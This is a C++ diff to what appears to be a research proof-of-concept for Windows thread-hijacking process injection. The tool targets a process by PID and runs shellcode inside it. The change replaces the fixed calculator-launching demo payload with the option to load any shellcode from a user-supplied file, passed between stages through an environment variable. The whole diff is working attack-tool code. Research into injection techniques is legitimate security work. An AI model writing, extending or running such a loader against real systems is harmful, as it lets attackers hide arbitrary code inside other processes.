@@ -140,14 +140,21 @@ int main(int argc, char* argv[])
 #ifdef _DEBUG
     std::cout << "[#] State: " << state << "\n";
 #endif
+
     if (state == STATE_UNINITIALIZED)
     {
         // check process:
         DWORD processID = 0;
         if (argc < 2) {
             std::cout << "Waiting Thread Hijacking (Split Mode). Target Wait Reason: " << KWAIT_REASON_TO_STRING(g_WaitReason) << "\n"
-                << "Arg <PID>" << std::endl;
+                << "Arg <PID> [shellcode_file*]\n"
+                << "* - optional; requires shellcode with clean exit"
+                << std::endl;
             return 0;
+        }
+        if (argc > 2) {
+            const char* filename = argv[2];
+            SetEnvironmentVariableA("SHC_FILE", filename);
         }
         processID = loadInt(argv[1], false);
         if (!processID) {
@@ -165,12 +172,29 @@ int main(int argc, char* argv[])
     }
     else
     {
+        BYTE* payload = g_shellcode_pop_calc;
+        size_t payload_size = sizeof(g_shellcode_pop_calc);
+        bool custom_shc = false;
+
+        char filename[MAX_PATH] = { 0 };
+        if (GetEnvironmentVariableA("SHC_FILE", filename, MAX_PATH)) {
+            payload = load_from_file(filename, payload_size);
+            if (!payload) {
+                std::cerr << "Failed loading shellcode from file: " << filename << std::endl;
+                return RET_OTHER_ERR;
+            }
+            custom_shc = true;
+            std::cout << "Using payload from file: " << filename << std::endl;
+        }
+
         size_t shellc_size = 0;
-        BYTE* shellc_buf = wrap_shellcode(g_shellcode_pop_calc, sizeof(g_shellcode_pop_calc), shellc_size);
+        BYTE* shellc_buf = wrap_shellcode(payload, payload_size, shellc_size);
 
         t_result res = execute_state(state, shellc_buf, shellc_size);
         ::free(shellc_buf); shellc_size = 0;
-
+        if (custom_shc) {
+            ::free(payload);
+        }
         if (res != RET_OK) {
             std::cerr << "Failed, result: " << res << "\n";
             return res;
